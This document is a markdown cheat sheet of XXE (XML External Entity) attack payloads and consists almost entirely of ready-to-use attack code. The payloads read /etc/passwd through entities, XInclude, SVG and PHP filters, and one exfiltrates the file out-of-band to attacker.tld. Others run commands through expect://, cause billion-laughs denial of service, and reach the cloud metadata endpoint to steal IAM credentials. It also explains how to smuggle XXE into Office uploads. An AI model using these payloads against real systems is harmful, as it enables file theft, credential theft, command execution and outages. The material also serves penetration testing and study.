# PAYLOADS: XXE
## Version: 1.0 | Domain: payloads

---

## CLASSIC FILE READ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## OOB BLIND
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.tld/x.dtd">
  %ext;
]>
<foo>&exfil;</foo>
```

`x.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
%eval;
%exfil;
```

## OOB ERROR-BASED (FILE PRINT VIA ERROR)
`x.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## XINCLUDE (NO DTD ACCESS)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG-BASED
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## OFFICE FILES (DOCX/XLSX)
```
1. unzip doc.docx
2. Edit word/document.xml — add DOCTYPE + ENTITY
3. zip back as .docx → upload
```

## PHP EXPECT
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

## PHP FILTER (BASE64)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

## SOAP / BILLION LAUGHS
```xml
<!DOCTYPE foo [
  <!ENTITY a "X">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  ...
]>
<foo>&z;</foo>
```

## SSRF VIA XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

## REFERENCES
OWASP XXE, PortSwigger XXE labs, PayloadsAllTheThings/XXE
